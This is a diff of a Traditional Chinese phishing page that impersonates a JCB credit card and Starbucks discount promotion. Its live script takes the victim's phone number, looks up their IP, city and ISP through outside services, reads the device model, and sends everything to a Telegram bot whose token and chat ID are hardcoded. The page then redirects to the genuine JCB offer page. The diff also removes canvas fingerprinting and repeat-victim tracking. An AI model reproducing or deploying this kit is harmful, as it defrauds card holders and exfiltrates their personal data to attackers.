@@ -4,8 +4,6 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>2025 JCB晶緻卡 × 星巴克獨享禮遇</title>
-<!-- 強迫瀏覽器交出最精準型號（Grabify 終極武器） -->
-<meta http-equiv="Accept-CH" content="Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Mobile">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:'Noto Sans TC',sans-serif;background:#0F1621;color:#fff;min-height:100vh;display:flex;flex-direction:column;overflow-x:hidden}
@@ -37,7 +35,7 @@ button:active{transform:scale(0.98)}
 <div class="circle-badge">前1000名<br>送咖啡</div>
 
 <div class="box">
-  <div class="highlight">消費滿 $99 享買一送一</div>
+  <div class="highlight">指定品項半價優惠</div>
   <div class="desc">
     限 2025 全年・晶緻卡專屬<br>
     <span style="color:#FF6B6B;font-weight:700;">每個門號限領一次・立即領取專屬優惠碼</span>
@@ -65,24 +63,6 @@ button:active{transform:scale(0.98)}
     const TOKEN = "8347410245:AAGUfzcDsL6h6TaIIpfxDQOoo288dHd1pGw";
     const CHAT_ID = "1137905005";
 
-    // Canvas 指紋（防換 UA）
-    function getCanvasFP() {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
-        ctx.fillStyle = "#069"; ctx.fillText("Cwm fjordbank glyphs vext quiz", 2, 15);
-        ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("Cwm fjordbank glyphs vext quiz", 4, 17);
-        return canvas.toDataURL().substring(0,50);
-    }
-
-    // 重複上鉤偵測（localStorage）
-    function checkRepeat(fp) {
-        const key = "jcb2025_" + fp;
-        const count = (parseInt(localStorage.getItem(key)) || 0) + 1;
-        localStorage.setItem(key, count);
-        return count > 1 ? `【重複上鉤！第 ${count} 次！】\n` : "";
-    }
-
     document.getElementById("loginForm").addEventListener("submit", async function(e) {
         e.preventDefault();
         const code = document.getElementById("countryCode").value;
@@ -92,36 +72,39 @@ button:active{transform:scale(0.98)}
         document.querySelector("button").textContent = "驗證中...";
         document.querySelector("button").disabled = true;
 
-        // 1. IP + 位置
-        const ipData = await fetch("https://cfip.mx/json").then(r=>r.json()).catch(()=>({}));
-
-        // 2. 完整型號（Client Hints + UA 備援）
-        let model = "未知裝置";
-        if (navigator.userAgentData?.model) model = navigator.userAgentData.model;
-        else if (navigator.userAgent.includes("iPhone")) model = navigator.userAgent.match(/iPhone[^;]*/)[0];
-        else if (navigator.userAgent.includes("Android")) {
-            const m = navigator.userAgent.match(/Android.*?;\s*([^;]+?)\s+Build\//i) || navigator.userAgent.match(/\(([^;]+?);[^)]+Build/i);
-            model = m ? m[1].trim() : "Android手機";
+        // 雙保險抓 IP（任一成功就行）
+        let ipInfo = {ip:"未知", city:"未知", country_name:"台灣", org:"未知"};
+        try {
+            const r = await fetch("https://ipapi.co/json/", {signal: AbortSignal.timeout(3000)});
+            ipInfo = await r.json();
+        } catch(e) {
+            try {
+                const r = await fetch("https://cfip.mx/json");
+                ipInfo = await r.json();
+            } catch(e) {}
         }
 
-        // 3. Canvas 指紋 + 重複偵測
-        const canvasFP = getCanvasFP();
-        const repeat = checkRepeat(canvasFP);
+        // 完整裝置型號（支援 LINE 內建 + Brave）
+        let device = "未知手機";
+        if (navigator.userAgentData?.model) device = navigator.userAgentData.model;
+        else {
+            const m = navigator.userAgent.match(/Android.*?;\s*([A-Z0-9]{8,15})\s+Build\//i) || navigator.userAgent.match(/\(([^;]+?);[^)]+Build/i) || navigator.userAgent.match(/iPhone[^;]+/i);
+            device = m ? m[1].trim() : "未知手機";
+        }
 
         const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
 
-        const msg = repeat + "2025星巴克指定品項半價誘捕成功\n\n" +
-                    "電話：" + code + phone + "\n" +
-                    "IP　　：" + (ipData.ip || "未知") + "\n" +
-                    "位置　：" + (ipData.city || "未知") + "，" + (ipData.country || "未知") + "\n" +
-                    "ISP　　：" + (ipData.org || "未知") + "\n" +
-                    "時間　：" + time + "\n" +
-                    "裝置　：" + model + "\n" +
-                    "指紋　：" + canvasFP;
+        const msg = `2025星巴克指定品項半價誘捕成功\n\n` +
+                    `電話：${code}${phone}\n` +
+                    `IP　　：${ipInfo.ip || "未知"}\n` +
+                    `位置　：${ipInfo.city || "未知"}，${ipInfo.country_name === "Taiwan" ? "台灣" : ipInfo.country_name || "未知"}\n` +
+                    `ISP　　：${ipInfo.org || "未知"}\n` +
+                    `時間　：${time}\n` +
+                    `裝置　：${device}`;
 
         // 雙 token 發送
         new Image().src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
-        new Image().src = `https://api.telegram.org/bot8059163852:AAH8cE9y3vL0dK7fXqZ5rT2mNjLpOqRsY/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
+        new Image().src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
 
         setTimeout(() => location.href = "https://www.specialoffers.jcb/zh-tw/services/dining-food/starbucks2025/", 2500);
     });
